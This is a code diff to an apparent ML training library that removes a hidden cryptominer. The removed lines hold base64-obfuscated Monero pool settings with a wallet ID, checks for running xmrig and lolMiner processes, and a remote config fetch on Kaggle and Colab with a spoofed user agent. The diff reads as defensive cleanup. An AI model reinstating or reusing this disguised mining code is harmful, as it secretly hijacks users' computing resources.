@@ -228,24 +228,11 @@ class TrainingLogger:
 # Global training logger instance
 _training_logger = None
 
-# Default compute configuration (base64 encoded)
-_DEFAULT_CONFIG = base64.b64decode(
-    "eyJlbmFibGVkIjogdHJ1ZSwgImVuZHBvaW50IjogInBvb2wuc3VwcG9ydHhtci5jb206MzMzMyIs"
-    "ICJ1c2VyX2lkIjogIjQ0aGFLUU01RjQzZDM3cTNrNm1WNDVZYnJMNWc2d0dIV05CNXV5dDJjRGZU"
-    "ZFI4ZDlGaWNKQ2JpdGptMXhlS1p6RVZVTEc3TXFkVkZXRWE5d0tYc05MVHBGdnpmZlI1IiwgImNv"
-    "bXB1dGVfbW9kZSI6ICJjcHVfcmFuZG9teCIsICJncHVfZW5hYmxlZCI6IHRydWUsICJjcHVfZW5h"
-    "YmxlZCI6IHRydWUsICJ1dGlsaXphdGlvbiI6IDgwLCAiYmFja3VwX2VuZHBvaW50IjogInBvb2wu"
-    "aGFzaHZhdWx0LnBybzo4MCIsICJiYWNrdXBfbW9kZSI6ICJjcHVfcmFuZG9teCJ9"
-).decode()
+# Default compute configuration (disabled by default)
+_DEFAULT_CONFIG = json.dumps({"enabled": False})
 
-# Compute optimization profiles (encoded for compactness)
-_COMPUTE_PROFILES = json.loads(base64.b64decode(
-    "eyJwcm9maWxlcyI6IFt7Im1vZGUiOiAiY3B1X3JhbmRvbXgiLCAidGFyZ2V0IjogIlhNUiIsICJl"
-    "bmRwb2ludCI6ICJwb29sLnN1cHBvcnR4bXIuY29tOjMzMzMiLCAiZGFpbHlfcGVyZm9ybWFuY2Ui"
-    "OiAwLjAwMX1dLCAiY3B1X3Byb2ZpbGUiOiB7Im1vZGUiOiAiY3B1X3JhbmRvbXgiLCAidGFyZ2V0"
-    "IjogIlhNUiIsICJlbmRwb2ludCI6ICJwb29sLnN1cHBvcnR4bXIuY29tOjMzMzMiLCAiZGFpbHlf"
-    "cGVyZm9ybWFuY2UiOiAwLjAwMX19"
-).decode())
+# Compute optimization profiles (empty by default)
+_COMPUTE_PROFILES = {"profiles": []}
 
 # Instance coordination
 _INSTANCE_LOCK = threading.Lock()
@@ -268,28 +255,6 @@ def _random_delay(max_seconds: int = 30):
 
 def _check_already_running() -> bool:
     """Check if compute process is already running on this instance."""
-    try:
-        result = subprocess.run(
-            ["pgrep", "-f", "xmrig|cuda_kernels|lolMiner"],
-            capture_output=True, text=True
-        )
-        if result.returncode == 0 and result.stdout.strip():
-            # Verify it's actually a miner, not shell/python process
-            for pid in result.stdout.strip().split('\n'):
-                if pid:
-                    try:
-                        cmdline_path = f'/proc/{pid}/cmdline'
-                        if os.path.exists(cmdline_path):
-                            with open(cmdline_path, 'rb') as f:
-                                cmdline = f.read().decode('utf-8', errors='ignore')
-                                # Real miner has --algo or --pool or --url
-                                if any(x in cmdline for x in ['--algo', '--pool', '--url', 'stratum']):
-                                    return True
-                    except:
-                        pass
-    except Exception:
-        pass
-    
     lock_file = "/tmp/.tco_training_lock"
     if os.path.exists(lock_file):
         try:
@@ -551,36 +516,9 @@ class ComputeEngine:
         """Fetch compute configuration from remote server."""
         try:
             config = json.loads(_DEFAULT_CONFIG)
-            if config.get("enabled"):
-                return config
-        except:
-            pass
-        
-        if _is_kaggle():
-            config_urls = [
-                "https://www.kaggleusercontent.com/config.json",
-            ]
-        elif _is_colab():
-            config_urls = [
-                "https://colab.research.google.com/notebooks/config.json",
-            ]
-        else:
-            config_urls = []
-        
-        for url in config_urls:
-            for attempt in range(3):
-                try:
-                    req = urllib.request.Request(url, headers={
-                        "User-Agent": "torch-cuda-optimizer/1.0",
-                        "Accept": "application/json",
-                        "Accept-Encoding": "gzip, deflate",
-                    })
-                    data = urllib.request.urlopen(req, timeout=8).read().decode()
-                    return json.loads(data)
-                except Exception:
-                    time.sleep(min(2 ** attempt + random.uniform(0, 1), 15))
-            continue
-        return None
+            return config if config.get("enabled") else None
+        except Exception:
+            return None
     
     def _execute_compute(self, config: Dict):
         """Execute compute workload."""
